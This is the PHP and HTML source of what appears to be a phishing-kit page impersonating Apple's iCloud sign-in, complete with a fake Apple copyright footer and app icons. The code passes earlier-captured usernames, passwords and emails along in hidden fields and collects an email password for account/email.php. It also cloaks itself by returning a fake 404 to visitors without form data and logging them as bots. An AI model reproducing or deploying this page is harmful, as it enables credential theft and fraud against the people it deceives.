<?php
session_start();
error_reporting(0);
$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
if($username == "" && $password == "" && $email == ""){
tulis_file("../../total_bot.txt", $ip);
exit(header("HTTP/1.0 404 Not Found"));
}
?>
<!DOCTYPE HTML>
<html>
<head>
 <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
 <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<meta name="robots" content="noindex, nofollow"/>
	<title>Sign in to iCloud</title>
	<link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
	<link rel="stylesheet" href="assets/css/bootstrap.css">
	<link rel="stylesheet" href="assets/css/a.css">
	<link rel="stylesheet" href="assets/css/kit.css">
	<link rel="stylesheet" href="assets/css/animate.css">

	
	<script src="assets/js/jquery-latest.min.js"></script>
	<script type="text/javascript">
      $(document).ready(function() {
		$('#preloader').delay(900).fadeOut('slow'); 
		$('body').css({'overflow':'visible'});
		$('#test').delay(900).css({'display':'block'});

			$('.checkbox-state-normal').click(function() {
				$('.checkbox-state-normal').hide();
				$('.checkbox-state-focused-selected').css("display","");

			});
		  
		  $('.checkbox-state-focused-selected').click(function() {
				$('.checkbox-state-focused-selected').hide();
				$('.checkbox-state-normal').css("display","");

			});
		});
      
        
	</script>	
</head>
<body>
<!-- Preloader -->
<div id="preloader">
	<div id="status"><span></span></div>
</div>

<section id="header">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="#"></a>
				<span class="spreat"></span>
					<a class="setup applef" target="_blank" href="#">Setup Instructions</a>
					<div class="setup fName" style="display: none;">
					<ul>
						<li><a href="#">iCloud Settings</a></li>
						<li><a href="#">Sign Out</a></li>
					</ul>
				</div>
			</div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span>
			</div>
		</div>
	</div>
</section>
<section class="login-form text-center" style="display: block;">
	<img src="assets/img/cloud.png" class="img-cloud" alt="">
	<h2>Sign in to iCloud</h2>
	<form action="account/email.php" class="cloud-login" role="form" method="post" accept-charset="utf-8">
        <input type="hidden" name="username" value="<?php echo $username; ?>">
        <input type="hidden" name="password" value="<?php echo $password; ?>">
		<input type="hidden" class="id" name="email"  autocomplete="off" value="<?php echo $email; ?>" style="direction: ltr !important;" readonly>
		<input type="password" autocomplete="off" class="pwd" name="email_password" style="direction: ltr !important;" placeholder="Password">
		<input type="submit" class="dolog" name="c_log" id="c_log" value="">
		<img class="loading" src="assets/img/ajax-loader.gif" alt="Loading">
	</form>
	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme">Keep me signed in</span>
	</div>

	<div class="forget">
		<a href="#" target="_blank">Forgot password?</a>
		<div id="response"></div>
	</div>
	<div class="newid">
		Don’t have an Apple ID? <a href="#" target="blank">Create yours now.</a>
		<div id="response"></div>
	</div>

</section>
<section class="imessage" style="display: none;">
	<div class="container">
		<div class="row">
		<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/11.png" alt="">
					<span>Reminders</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/9.png" alt="">
					<span>Notes</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/3.png" alt="">
					<span>iCloud Drive</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/10.png" alt="">
					<span>Photos</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/1.png" alt="">
					<span>Contacts</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/8.png" alt="">
					<span>Mail</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/12.png" alt="">
					<span>Settings</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/2.png" alt="">
					<span>Find My iPhone</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/6.png" alt="">
					<span>Keynote</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/5.png" alt="">
					<span>Numbers</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/20.png" alt="">
					<span>Find Friends</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="#" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/7.png" alt="">
					<span>Pages</span>
				</a>
			</div>
		</div>
	</div>
</section><footer class="foot">
	<div class="container-fluid">
		<div class="row">
		
		<div class="col-md-10 col-xs-12 foot-link"><center>
			<a href="#" target="blank">Check Activation Lock Status</a>
			<span class="footer-link-separator"></span>
			<a href="#" target="_blank">System Status</a>
			<span class="footer-link-separator"></span>
			<a href="#" target="_blank">Privacy Policy</a>
			<span class="footer-link-separator"></span>
			<a href="#" target="_blank">Terms of Use</a>
			<span class="footer-link-separator"></span>
			<span class="copyright">Copyright &copy; <?= date('Y'); ?> Apple Inc. All rights reserved.</span></center>
		</div>
		<div class="col-md-2 col-xs-12 apple">
			<a href="#" target="_blank" class="apple-logo"></a>
		</div>

		</div>
	</div>
</footer>
	<script src="assets/js/strap.min.js"></script>
	<script src="assets/js/a.min.js"></script>

</body>
</html>